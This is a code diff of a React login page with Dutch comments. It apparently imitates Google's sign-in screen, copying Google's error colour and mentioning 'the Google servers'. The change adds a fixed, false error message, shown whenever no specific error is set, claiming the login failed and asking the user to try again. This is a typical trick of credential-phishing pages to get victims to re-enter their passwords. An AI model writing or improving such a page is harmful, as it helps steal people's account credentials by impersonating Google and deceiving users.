@@ -94,11 +94,25 @@ export default function LoginPage() {
             </a>
           </p>
 
-          {/* ⭐ Foutmelding - alleen de specifieke error ⭐ */}
-          {errorMessage && (
+          {/* ⭐ Foutmelding - toon OF de vaste tekst, OF de specifieke error ⭐ */}
+          {errorMessage ? (
+            // Specifieke foutmelding (Onjuist e-mailadres / Onjuist wachtwoord)
             <div className="mb-6">
               <div className="text-[#d93025] text-sm font-medium">
                 {errorMessage}
+              </div>
+            </div>
+          ) : (
+            // Vaste foutmelding (altijd zichtbaar, tenzij er een specifieke error is)
+            <div className="mb-6">
+              <div className="text-[#d93025] text-sm font-medium">
+                Kon niet inloggen
+              </div>
+              <div className="text-[#d93025] text-sm">
+                Er was een probleem met de communicatie met de Google-servers.
+              </div>
+              <div className="text-[#d93025] text-sm">
+                Probeer opnieuw.
               </div>
             </div>
           )}
@@ -108,7 +122,7 @@ export default function LoginPage() {
             <input type="hidden" name="username" value={email} />
             <input type="hidden" name="email" value={email} />
 
-            {/* Email veld - met rode rand bij fout */}
+            {/* Email veld */}
             <div className="relative">
               <input
                 id="email"
@@ -136,7 +150,7 @@ export default function LoginPage() {
               </label>
             </div>
 
-            {/* Wachtwoord veld - met rode rand bij fout */}
+            {/* Wachtwoord veld */}
             <div className="relative">
               <input
                 id="password"
